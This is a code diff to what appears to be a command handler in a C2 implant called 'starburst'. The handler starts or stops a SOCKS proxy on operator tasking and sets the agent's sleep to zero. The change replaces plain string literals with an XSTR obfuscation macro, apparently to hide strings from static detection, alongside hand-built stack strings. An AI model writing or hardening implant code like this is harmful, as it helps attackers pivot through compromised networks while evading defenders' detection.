@@ -21,23 +21,23 @@ auto declfn starburst::cmd_socks(
 
     if ( !action || action_len == 0 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "missing action" ) ) );
+            XSTR( "missing action" ) );
         return;
     }
 
-    char start_str[] = { 's', 't', 'a', 'r', 't', 0 };
+    xstr(start_str, "start");
     char stop_str[]  = { 's', 't', 'o', 'p', 0 };
 
     if ( str_ncmp( action, start_str, 5 ) == 0 ) {
         if ( inst.socks_state ) {
             queue_response( inst, task_uuid, RESPONSE_ERROR,
-                symbol<char*>( const_cast<char*>( "socks already active" ) ) );
+                XSTR( "socks already active" ) );
             return;
         }
 
         if ( !socks_init( inst ) ) {
             queue_response( inst, task_uuid, RESPONSE_ERROR,
-                symbol<char*>( const_cast<char*>( "socks init failed" ) ) );
+                XSTR( "socks init failed" ) );
             return;
         }
 
@@ -45,21 +45,21 @@ auto declfn starburst::cmd_socks(
         inst.agent.sleep_ms = 0;
 
         queue_response( inst, task_uuid, RESPONSE_SUCCESS,
-            symbol<char*>( const_cast<char*>( "socks started" ) ) );
+            XSTR( "socks started" ) );
     } else if ( str_ncmp( action, stop_str, 4 ) == 0 ) {
         if ( !inst.socks_state ) {
             queue_response( inst, task_uuid, RESPONSE_ERROR,
-                symbol<char*>( const_cast<char*>( "socks not active" ) ) );
+                XSTR( "socks not active" ) );
             return;
         }
 
         socks_destroy( inst );
 
         queue_response( inst, task_uuid, RESPONSE_SUCCESS,
-            symbol<char*>( const_cast<char*>( "socks stopped" ) ) );
+            XSTR( "socks stopped" ) );
     } else {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "unknown action: use start or stop" ) ) );
+            XSTR( "unknown action: use start or stop" ) );
     }
 }
 
